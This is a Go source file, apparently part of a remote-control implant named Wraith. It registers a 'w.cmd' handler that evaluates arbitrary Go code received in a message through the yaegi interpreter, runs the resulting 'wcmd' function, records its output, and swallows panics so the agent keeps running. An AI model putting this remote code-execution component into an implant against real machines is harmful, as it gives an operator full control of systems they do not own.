package parts

import (
	"fmt"

	"github.com/0x1a8510f2/wraith/proto"

	"github.com/traefik/yaegi/interp"
	"github.com/traefik/yaegi/stdlib"
)

func init() {
	proto.PartMap.Add("w.cmd", func(hkvs *proto.HandlerKeyValueStore, data interface{}) {
		// Store results of command
		result := ""

		defer func() {
			// Always catch panics from here as no error should crash Wraith
			if r := recover(); r != nil {
				result = fmt.Sprintf("command execution panicked with message: %s", r)
			}
			// Record results (this should never error as w.msg.results is a special key)
			currentResults, _ := hkvs.Get("w.msg.results")
			hkvs.Set("w.msg.results", append(currentResults.([]string), result))
		}()

		// Initialise yaegi to handle commands
		i := interp.New(interp.Options{})
		i.Use(stdlib.Symbols)
		// The code should generate a function called "wcmd" to be executed by Wraith.
		// That function should in turn return a string to be used as the result.
		// If the value of the key cmd is not a string, the panic will be caught and
		// returned as the command result.
		_, err := i.Eval(data.(string))
		if err != nil {
			panic(err)
		}
		fnv, err := i.Eval("wcmd")
		if err != nil {
			panic(err)
		}
		fn, ok := fnv.Interface().(func() string)
		if !ok {
			panic("wcmd is not a `func() string`")
		}
		result = fn()
	})
}
